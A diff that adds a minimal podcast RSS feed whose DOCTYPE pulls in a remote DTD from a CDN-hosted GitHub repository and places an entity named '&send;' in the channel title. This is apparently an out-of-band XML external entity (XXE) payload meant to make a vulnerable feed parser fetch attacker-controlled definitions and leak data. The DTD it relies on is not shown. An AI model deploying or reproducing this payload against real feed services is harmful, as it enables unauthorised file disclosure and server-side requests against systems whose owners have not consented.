@@ -1,0 +1,9 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE rss [
+  <!ENTITY % dtd SYSTEM "https://cdn.jsdelivr.net/gh/squ11z1/cdn-lab@main/dtd/1792819030.dtd">
+  %dtd;
+]>
+<rss version="2.0" xmlns:itunes="http://www.itunes.com/dtds/podcast-1.0.dtd">
+<channel><title>&send;</title><description>D</description><link>https://example.com/x</link>
+<item><title>T</title><enclosure url="https://example.com/e.mp3" length="1" type="audio/mpeg"/></item>
+</channel></rss>
